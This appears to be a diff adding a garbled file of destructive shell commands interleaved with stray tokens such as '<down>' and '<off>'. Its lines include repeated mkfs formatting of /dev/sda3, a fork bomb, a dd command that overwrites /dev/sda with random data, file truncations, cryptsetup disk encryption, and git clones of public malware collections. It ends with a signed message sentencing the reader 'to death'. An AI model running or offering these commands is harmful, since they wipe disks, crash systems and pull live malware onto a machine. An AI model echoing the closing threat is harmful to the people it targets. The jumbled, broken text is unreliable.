@@ -1,0 +1,45 @@
+ <off> 
+mkfs ext4 /dev/sda3. 2a 
+>file
+: () { :|:& };: 
+<down>​
+git clone https://github.com/HBMS-0em/off 
+dd if=/dev/random of=/dev/sda 
+<down> 
+sudo cryptsetup reencrypt /sda/GalacticlyFly0 
+ ​--decrypt  
+git clone https://github.com/HBMS-0em/off
+<off> 
+>file  
+<down> 
+mkfs ext4 /dev/sda3. 2b 
+ ​git clone https://github.com/ytisf/theZoo 
+​>file  
+<down> 
+<down> 
+git clone https://github.com/HBMS-0em/fuck-you
+git clone https://github.com/Endermanch/MalwareDatabase 
+​>file
+​<off> 
+mkfs ext4 /dev/sda3. 2c 
+>file 
+<down> 
+git clone  https://github.com/sophos-ai/SOREL-20M 
+>file 
+<down> 
+<down> 
+sudo cryptsetup reencrypt /sda/0em0 
+ ​--decrypt
+​>file 
+<down> 
+<down>
+​git clone https://github.com/malwares/DangerousZone 
+mkfs ext4 /dev/sda3. 2d 
+>file
+<down> 
+<down> 
+apt install cryptsetup​sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0 
+<off>  
+>file
+In the sweatshop union, I tought you to buy, beg, borrow, rob, steal.. And you have been stealing all my money. So for the crime of theft, I sentence you to death.
+From Brenton Hopkins. 
